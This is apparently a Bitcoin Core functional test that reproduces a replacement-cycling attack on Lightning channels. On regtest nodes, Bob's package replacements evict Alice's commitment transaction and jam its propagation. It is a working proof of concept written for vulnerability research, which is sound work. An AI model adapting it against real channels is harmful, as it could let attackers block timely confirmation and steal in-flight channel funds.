#!/usr/bin/env python3
# Copyright (c) 2023 The Bitcoin Core developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.

"""Test replacement cyling attacks against Lightning channels with package support"""

from test_framework.key import (
        ECKey
)

from test_framework.messages import (
        CTransaction,
        CTxIn,
        CTxInWitness,
        CTxOut,
        COutPoint,
        sha256,
        COIN,
        tx_from_hex,
)

from test_framework.util import (
        assert_equal
)

from test_framework.script import (
        CScript,
        hash160,
        OP_IF,
        OP_HASH160,
        OP_EQUAL,
        OP_ELSE,
        OP_ENDIF,
        OP_CHECKSIG,
        OP_SWAP,
        OP_SIZE,
        OP_NOTIF,
        OP_DROP,
        OP_CHECKMULTISIG,
        OP_EQUALVERIFY,
        OP_0,
        OP_2,
        OP_TRUE,
        SegwitV0SignatureHash,
        SIGHASH_ALL,
        SIGHASH_SINGLE,
        SIGHASH_ANYONECANPAY,
)

from test_framework.test_framework import BitcoinTestFramework

from test_framework.wallet import MiniWallet

def get_funding_redeemscript(funder_pubkey, fundee_pubkey):
    return CScript([OP_2, funder_pubkey.get_bytes(), fundee_pubkey.get_bytes(), OP_2, OP_CHECKMULTISIG])

def get_anchor_single_key_redeemscript(pubkey):
    return CScript([pubkey.get_bytes(), OP_CHECKSIG])

def generate_funding_chan(wallet, coin, funder_pubkey, fundee_pubkey):
    witness_script = get_funding_redeemscript(funder_pubkey, fundee_pubkey)
    witness_program = sha256(witness_script)
    script_pubkey = CScript([OP_0, witness_program])

    funding_tx = CTransaction()
    funding_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b""))
    funding_tx.vout.append(CTxOut(int(49.99998 * COIN), script_pubkey))
    funding_tx.rehash()

    wallet.sign_tx(funding_tx)
    return funding_tx

def generate_parent_tx(wallet, coin, sat_per_vbyte):
    ## We build a junk parent transaction for the second-stage HTLC-preimage
    junk_parent_fee = 158 * sat_per_vbyte

    junk_script = CScript([OP_TRUE])
    junk_scriptpubkey = CScript([OP_0, sha256(junk_script)])

    junk_parent = CTransaction()
    junk_parent.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b""))
    junk_parent.vout.append(CTxOut(int(49.99998 * COIN - junk_parent_fee), junk_scriptpubkey))

    wallet.sign_tx(junk_parent)
    junk_parent.rehash()

    child_tx_fee = 158 * sat_per_vbyte
 
    return junk_parent

def generate_replacement_child_tx(input_amount, sat_per_vbyte, confirmed_ancestor):
    anchor_output_script = CScript([OP_TRUE])
    anchor_output_scriptpubkey = CScript([OP_0, sha256(anchor_output_script)])

    child_tx_fee = 158 * sat_per_vbyte
    child_tx = CTransaction()
    child_tx.nVersion = 3
    child_tx.vin.append(CTxIn(COutPoint(int(confirmed_ancestor.hash, 16), 0), b"", 0))
    child_tx.vout.append(CTxOut(int(input_amount - child_tx_fee), anchor_output_scriptpubkey))

    child_tx.wit.vtxinwit.append(CTxInWitness())
    child_tx.wit.vtxinwit[0].scriptWitness.stack = [anchor_output_script]
    child_tx.rehash()

    return (child_tx)

def create_chan_state_single_parent(funding_txid, funding_vout, funder_seckey, fundee_seckey, input_amount, input_script, sat_per_vbyte, timelock, hashlock, nSequence):
    witness_script = CScript([fundee_seckey.get_pubkey().get_bytes(), OP_SWAP, OP_SIZE, 32,
        OP_EQUAL, OP_NOTIF, OP_DROP, 2, OP_SWAP, funder_seckey.get_pubkey().get_bytes(), 2, OP_CHECKMULTISIG, OP_ELSE,
        OP_HASH160, hashlock, OP_EQUALVERIFY, OP_CHECKSIG, OP_ENDIF])
    htlc_witness_program = sha256(witness_script)
    htlc_script_pubkey = CScript([OP_0, htlc_witness_program])

    anchor_output_script = CScript([OP_TRUE])
    anchor_output_scriptpubkey = CScript([OP_0, sha256(anchor_output_script)])
    anchor_output_amount = 10000

    # Expected size = 158 vbyte
    commitment_fee = 158 * sat_per_vbyte
    commitment_tx = CTransaction()
    commitment_tx.nVersion = 3
    commitment_tx.vin.append(CTxIn(COutPoint(int(funding_txid, 16), funding_vout), b"", 0x1))
    commitment_tx.vout.append(CTxOut(int(input_amount - 158 * sat_per_vbyte - anchor_output_amount), htlc_script_pubkey))
    commitment_tx.vout.append(CTxOut(int(anchor_output_amount), anchor_output_scriptpubkey))

    sig_hash = SegwitV0SignatureHash(input_script, commitment_tx, 0, SIGHASH_ALL, int(input_amount))
    funder_sig = funder_seckey.sign_ecdsa(sig_hash) + b'\x01'
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b'\x01'

    commitment_tx.wit.vtxinwit.append(CTxInWitness())
    commitment_tx.wit.vtxinwit[0].scriptWitness.stack = [b'', funder_sig, fundee_sig, input_script]
    commitment_tx.rehash()

    child_tx_fee = 158 * sat_per_vbyte
    child_tx = CTransaction()
    child_tx.nVersion = 3
    child_tx.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 1), b"", nSequence))
    child_tx.vout.append(CTxOut(int(anchor_output_amount - child_tx_fee), anchor_output_scriptpubkey))

    child_tx.wit.vtxinwit.append(CTxInWitness())
    child_tx.wit.vtxinwit[0].scriptWitness.stack = [anchor_output_script]
    child_tx.rehash()

    return (commitment_tx, child_tx)

def create_chan_state_multiple_parent(funding_txid, funding_vout, funder_seckey, fundee_seckey, input_amount, input_script, commitment_sat_per_vbyte, child_sat_per_vbyte, timelock, hashlock, nSequence, confirmed_ancestor):
    witness_script = CScript([fundee_seckey.get_pubkey().get_bytes(), OP_SWAP, OP_SIZE, 32,
        OP_EQUAL, OP_NOTIF, OP_DROP, 2, OP_SWAP, funder_seckey.get_pubkey().get_bytes(), 2, OP_CHECKMULTISIG, OP_ELSE,
        OP_HASH160, hashlock, OP_EQUALVERIFY, OP_CHECKSIG, OP_ENDIF])
    htlc_witness_program = sha256(witness_script)
    htlc_script_pubkey = CScript([OP_0, htlc_witness_program])

    anchor_output_script = CScript([OP_TRUE])
    anchor_output_scriptpubkey = CScript([OP_0, sha256(anchor_output_script)])
    anchor_output_amount = 10000

    # Expected size = 158 vbyte
    commitment_fee = 158 * commitment_sat_per_vbyte
    commitment_tx = CTransaction()
    commitment_tx.nVersion = 3
    commitment_tx.vin.append(CTxIn(COutPoint(int(funding_txid, 16), funding_vout), b"", 0x1))
    commitment_tx.vout.append(CTxOut(int(input_amount - commitment_fee - anchor_output_amount), htlc_script_pubkey))
    commitment_tx.vout.append(CTxOut(int(anchor_output_amount), anchor_output_scriptpubkey))

    sig_hash = SegwitV0SignatureHash(input_script, commitment_tx, 0, SIGHASH_ALL, int(input_amount))
    funder_sig = funder_seckey.sign_ecdsa(sig_hash) + b'\x01'
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b'\x01'

    commitment_tx.wit.vtxinwit.append(CTxInWitness())
    commitment_tx.wit.vtxinwit[0].scriptWitness.stack = [b'', funder_sig, fundee_sig, input_script]
    commitment_tx.rehash()

    child_tx_fee = 158 * child_sat_per_vbyte
    child_tx = CTransaction()
    child_tx.nVersion = 3
    child_tx.vin.append(CTxIn(COutPoint(int(confirmed_ancestor.hash, 16), 0), b"", nSequence))
    child_tx.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 1), b"", nSequence))
    child_tx.vout.append(CTxOut(int(input_amount + anchor_output_amount - child_tx_fee), anchor_output_scriptpubkey))


    child_tx.wit.vtxinwit.append(CTxInWitness())
    child_tx.wit.vtxinwit[0].scriptWitness.stack = [anchor_output_script]
    child_tx.wit.vtxinwit.append(CTxInWitness())
    child_tx.wit.vtxinwit[1].scriptWitness.stack = [anchor_output_script]
    child_tx.rehash()

    return (commitment_tx, child_tx)

class ReplacementCyclingPackageTest(BitcoinTestFramework):

    def set_test_params(self):
        self.num_nodes = 2

    def test_replacement_cycling_package(self):
        alice = self.nodes[0]
        alice_seckey = ECKey()
        alice_seckey.generate(True)

        bob = self.nodes[1]
        bob_seckey = ECKey()
        bob_seckey.generate(True)

        self.generate(alice, 501)

        self.sync_all()

        self.connect_nodes(0, 1)

        coin_1 = self.wallet.get_utxo()

        wallet = self.wallet

        # Generate funding transaction opening channel between Alice and Bob.
        ab_funding_tx = generate_funding_chan(wallet, coin_1, alice_seckey.get_pubkey(), bob_seckey.get_pubkey())

        # Propagate and confirm funding transaction.
        ab_funding_txid = alice.sendrawtransaction(hexstring=ab_funding_tx.serialize().hex(), maxfeerate=0)

        self.sync_all()

        assert ab_funding_txid in alice.getrawmempool()
        assert ab_funding_txid in bob.getrawmempool()

        # We mine one block the Alice - Bob channel is opened.
        self.generate(alice, 1)
        assert_equal(len(alice.getrawmempool()), 0)
        assert_equal(len(bob.getrawmempool()), 0)

        coin_2 = self.wallet.get_utxo()

        # Generate and confirm an ancestor to be spend by future Bob's child tx.
        bob_ancestor_tx = generate_parent_tx(wallet, coin_2, 1)

        bob_ancestor_txid = bob.sendrawtransaction(hexstring=bob_ancestor_tx.serialize().hex(), maxfeerate=0)

        self.sync_all()

        assert bob_ancestor_txid in alice.getrawmempool()
        assert bob_ancestor_txid in bob.getrawmempool()

        self.generate(bob, 1)

        lastblockhash = alice.getbestblockhash()
        block = alice.getblock(lastblockhash)
        lastblockheight = block['height']

        hashlock = hash160(b'a' * 32)

        funding_redeemscript = get_funding_redeemscript(alice_seckey.get_pubkey(), bob_seckey.get_pubkey())

        # Generate alice commitment_tx and child tx, all 2 sat / vbyte
        # Child tx single parent, the alice commitment_tx
        (alice_commitment_tx, alice_child_tx) = create_chan_state_single_parent(ab_funding_txid, 0, alice_seckey, bob_seckey, 49.99998 * COIN, funding_redeemscript, 2, lastblockheight + 20, hashlock, 0)

        self.log.info("Submitting as a package Alice transactions...")

        alice_commitment_txid = alice_commitment_tx.hash
        alice_child_txid = alice_child_tx.hash

        alice_commitment_wtxid = alice_commitment_tx.getwtxid()
        alice_child_wtxid = alice_child_tx.getwtxid()

        self.log.info("Alice commitment txid {} wtxid {}".format(alice_commitment_txid, alice_commitment_wtxid))
        self.log.info("Alice child txid {} wtxid {}".format(alice_child_txid, alice_child_wtxid))

        alice_submitres = alice.submitpackage([alice_commitment_tx.serialize().hex(), alice_child_tx.serialize().hex()])

        alice_commitment_result_fees = alice_submitres["tx-results"][alice_commitment_wtxid]["fees"]
        alice_commitment_result_txid = alice_submitres["tx-results"][alice_commitment_wtxid]["txid"]
        alice_child_result_fees = alice_submitres["tx-results"][alice_child_wtxid]["fees"]
        alice_child_result_txid = alice_submitres["tx-results"][alice_child_wtxid]["txid"]

        self.log.info("Alice package result submission commitment tx {} {}".format(alice_commitment_result_txid, alice_commitment_result_fees))
        self.log.info("Alice package result submission child tx {} {}".format(alice_child_result_txid, alice_child_result_fees))

        #self.log.info("Alice package total fees {}".format(alice_commitment_tx_fees + alice_child_tx_fees))

        self.sync_all()

        assert alice_commitment_txid in alice.getrawmempool()
        assert alice_child_txid in alice.getrawmempool()
        assert alice_commitment_txid in bob.getrawmempool()
        assert alice_child_txid in bob.getrawmempool()

        (bob_commitment_tx, bob_child_tx) = create_chan_state_multiple_parent(ab_funding_txid, 0, alice_seckey, bob_seckey, 49.99998 * COIN, funding_redeemscript, 1, 10, lastblockheight + 20, hashlock, 0, bob_ancestor_tx)

        self.log.info("Submitting as a package Bob transactions...")

        bob_commitment_txid = bob_commitment_tx.hash
        bob_child_txid = bob_child_tx.hash

        bob_commitment_wtxid = bob_commitment_tx.getwtxid()
        bob_child_wtxid = bob_child_tx.getwtxid()

        self.log.info("Bob commitment txid {} wtxid {}".format(bob_commitment_tx.hash, bob_commitment_wtxid))
        self.log.info("Bob child txid {} wtxid {}".format(bob_child_tx.hash, bob_child_wtxid))

        bob_submitres = bob.submitpackage([bob_commitment_tx.serialize().hex(), bob_child_tx.serialize().hex()])
        # We independently submit the package in Alice mempool as there is no p2p package relay and nversion3 on all on the same public branch (oct. 2023), to emulate p2p package download.
        alice.submitpackage([bob_commitment_tx.serialize().hex(), bob_child_tx.serialize().hex()])
    
        bob_commitment_result_fees = bob_submitres["tx-results"][bob_commitment_wtxid]["fees"]
        bob_commitment_result_txid = bob_submitres["tx-results"][bob_commitment_wtxid]["txid"]
        bob_child_result_fees = bob_submitres["tx-results"][bob_child_wtxid]["fees"]
        bob_child_result_txid = bob_submitres["tx-results"][bob_child_wtxid]["txid"]

        bob_replaced_txn = bob_submitres["replaced-transactions"]

        self.log.info("Bob package result submission commitment tx {} {}".format(bob_commitment_result_txid, bob_commitment_result_fees))
        self.log.info("Bob package result submission child tx {} {}".format(bob_child_result_txid, bob_child_result_fees))
        self.log.info("Bob package result replaced transactions {}".format(bob_replaced_txn))

        self.sync_all()

        assert bob_commitment_txid in alice.getrawmempool()
        assert bob_child_txid in alice.getrawmempool()
        assert bob_commitment_txid in bob.getrawmempool()
        assert bob_child_txid in bob.getrawmempool()
    
        # Now, we generate a higher feerate / absolute fee replacement of the child transaction
        bob_replacement_child_tx = generate_replacement_child_tx(49.99998 * COIN, 20, bob_ancestor_tx)

        bob_replacement_child_txid = bob.sendrawtransaction(hexstring=bob_replacement_child_tx.serialize().hex(), maxfeerate=0)

        self.sync_all()

        assert bob_replacement_child_txid in alice.getrawmempool()
        assert bob_replacement_child_txid in bob.getrawmempool()
        assert not bob_child_txid in alice.getrawmempool()
        assert not bob_child_txid in bob.getrawmempool()
        # Bob got evicted. See example logs.
        # "node0 2023-10-14T02:36:43.244841Z [scheduler] [validationinterface.cpp:224] [operator()] [validation] TransactionRemovedFromMempool: txid=c3f632f3ae71c1f92fc831d91048be56bd70efa2f9a210f14a07e9551149992c wtxid=dceace7354c5f48fe8e07d #     74e83b08960eba6400fb616caa76945d357643730c reason=sizelimit"
        # Comment in TrimToSize about "minimum reasonable fee rate"
        assert not bob_commitment_txid in alice.getrawmempool()
        assert not bob_commitment_txid in bob.getrawmempool()

        assert_equal(len(alice.getrawmempool()), 1)
        assert_equal(len(bob.getrawmempool()), 1)

        entry = bob.getmempoolentry(bob_replacement_child_txid)
        self.log.info("Bob replacement child result {}".format(entry))

        self.log.info("Bob successfully jammed Alice's package propagation and evicted its own replacement commitment transaction from network mempools")

    def run_test(self):
        self.wallet = MiniWallet(self.nodes[0])

        self.test_replacement_cycling_package()

if __name__ == '__main__':
    ReplacementCyclingPackageTest().main()
